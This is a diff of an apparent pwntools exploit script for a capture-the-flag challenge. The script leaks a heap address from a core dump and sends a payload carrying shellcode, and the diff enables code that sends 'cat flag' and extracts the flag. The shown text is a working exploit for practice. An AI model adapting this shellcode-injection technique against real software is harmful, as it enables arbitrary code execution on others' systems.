@@ -43,7 +43,7 @@ io.wait()
 core = io.corefile
 heap_addr = next(core.search(cyclic(10)))
 print(hex(heap_addr))
-os.unlink(core)
+os.unlink(core.path)
     
 # launch the main process (still boilerplate)
 if DEBUG:
@@ -63,12 +63,11 @@ else:
 
 payload = hex(heap_addr + 9).encode('utf8') + b'_' + shellcode
 io.send(payload)
-io.interactive()
 
 # END CHALLENGE-SPECIFIC CODE
 # BEGIN FLAG RETRIEVAL BOILERPLATE
 
-# import re
-# io.sendlineafter(b'Spawning a privileged shell', b'cat flag')
-# flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
-# print(flag)
+import re
+io.sendlineafter(b'Where', b'cat flag')
+flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
+print(flag)
